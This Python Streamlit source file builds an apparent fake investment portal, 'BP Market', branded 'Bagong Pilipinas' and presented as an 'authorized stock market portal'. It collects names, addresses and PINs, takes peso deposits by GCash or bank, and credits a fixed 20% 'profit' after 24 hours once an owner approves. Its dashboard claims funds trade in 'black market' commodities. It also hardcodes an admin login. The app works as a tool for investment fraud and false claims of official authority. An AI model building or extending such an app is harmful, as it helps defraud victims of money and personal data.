import streamlit as st
import time
from datetime import datetime, timedelta

# --- 1. APP CONFIGURATION ---
st.set_page_config(page_title="BP Market", page_icon="🇵🇭")

# --- 2. THEME & UI ---
st.markdown("""
<style>
    .stApp { margin-top: 20px; }
    input[type="text"] { text-transform: uppercase; }
    .stButton>button {
        width: 100%;
        border-radius: 12px;
        height: 3.5em;
        background-color: #0038a8;
        color: white;
        font-weight: bold;
        border: none;
    }
    .logo-text {
        text-align: center;
        color: #0038a8;
        font-weight: 900;
        font-size: 2.2em;
        line-height: 1.2;
    }
    .info-box {
        background-color: #f8fafc;
        padding: 20px;
        border-radius: 15px;
        border: 1px solid #0038a8;
        margin-bottom: 20px;
        color: #1e293b;
    }
</style>
""", unsafe_allow_html=True)

# --- 3. LOGO ---
st.markdown('<p class="logo-text">🇵🇭 BAGONG<br>PILIPINAS</p>', unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #64748b; font-weight: bold;'>AUTHORIZED STOCK MARKET PORTAL</p>", unsafe_allow_html=True)

# --- 4. SESSION STATE ---
if 'page' not in st.session_state:
    st.session_state.page = "login"
if 'db_user' not in st.session_state:
    st.session_state.db_user = None
if 'deposits' not in st.session_state:
    st.session_state.deposits = []
if 'pending_deposits' not in st.session_state:
    st.session_state.pending_deposits = [] 

# --- 5. PAGE: LOGIN ---
if st.session_state.page == "login":
    st.subheader("LOGIN")
    l_name = st.text_input("FULL NAME").upper()
    l_pin = st.text_input("PASSWORD / PIN", type="password")
    
    if st.button("ENTER MARKET"):
        # UPDATED OWNER LOGIN - New Secret Code: 090807
        if l_name == "ADMIN" and l_pin == "090807":
            st.session_state.page = "admin"
            st.rerun()
        elif st.session_state.db_user and l_name == st.session_state.db_user['name'] and l_pin == st.session_state.db_user['pin']:
            st.session_state.page = "dashboard"
            st.rerun()
        else:
            st.error("INVALID CREDENTIALS")
    
    st.write("---")
    if st.button("NO ACCOUNT? SIGN UP HERE"):
        st.session_state.page = "signup"
        st.rerun()

# --- 6. PAGE: SIGN UP ---
elif st.session_state.page == "signup":
    st.subheader("CREATE ACCOUNT")
    reg_name = st.text_input("FULL NAME").upper()
    reg_address = st.text_input("FULL ADDRESS").upper()
    st.markdown("---")
    pin1 = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6)
    pin2 = st.text_input("VERIFY 6-DIGIT PIN", type="password", max_chars=6)

    if st.button("COMPLETE REGISTRATION"):
        if pin1 == pin2 and len(pin1) == 6 and pin1.isdigit():
            st.session_state.db_user = {"name": reg_name, "pin": pin1, "address": reg_address}
            st.success("✅ REGISTRATION SUCCESSFUL!")
            time.sleep(1)
            st.session_state.page = "login"
            st.rerun()
        else:
            st.error("PIN MUST BE 6 NUMBERS")

# --- 7. PAGE: OWNER ADMIN ---
elif st.session_state.page == "admin":
    st.subheader("👑 OWNER DASHBOARD")
    if not st.session_state.pending_deposits:
        st.info("No pending deposits.")
    for i, dep in enumerate(st.session_state.pending_deposits):
        st.write(f"User: {dep['user']} | Amount: ₱{dep['amount']:,}")
        if st.button("APPROVE", key=f"adep_{i}"):
            st.session_state.deposits.append({"amount": dep['amount'], "release_time": datetime.now() + timedelta(hours=24), "profit": dep['amount'] * 0.20})
            st.session_state.pending_deposits.pop(i)
            st.rerun()
    if st.button("LOGOUT"):
        st.session_state.page = "login"
        st.rerun()

# --- 8. PAGE: USER DASHBOARD ---
elif st.session_state.page == "dashboard":
    st.markdown(f"""
    <div class="info-box">
        <h3 style="color:#0038a8; margin-top:0;">📊 HOW YOUR CAPITAL WORKS</h3>
        <p><b>YOUR EVERY PENNY IS USED TO TRADE IN THE STOCK MARKET OR BLACK MARKET INTERNATIONAL TRADING OF COMMODITIES AND ETC.</b></p>
        <p>We utilize specialized global trading routes and high-frequency market strategies to ensure your investment grows at an accelerated rate compared to traditional banking. By diversifying into international commodities and niche markets, we secure the high returns our platform is known for.</p>
    </div>
    """, unsafe_allow_html=True)

    total_balance = sum(d['amount'] for d in st.session_state.deposits) + sum(d['profit'] for d in st.session_state.deposits)
    st.metric("TOTAL BALANCE", f"₱{total_balance:,.2f}")

    st.subheader("📥 INVEST (GCASH / BANK)")
    selected_amt = st.selectbox("PESO AMOUNT", [100, 500, 1000, 5000, 10000, 20000, 30000, 50000])
    
    if st.button(f"PROCEED TO PAY ₱{selected_amt:,}"):
        st.session_state.pending_deposits.append({"user": st.session_state.db_user['name'], "amount": float(selected_amt)})
        st.success("Investment Request Sent to Owner!")

    if st.button("LOGOUT"):
        st.session_state.page = "login"
        st.rerun()
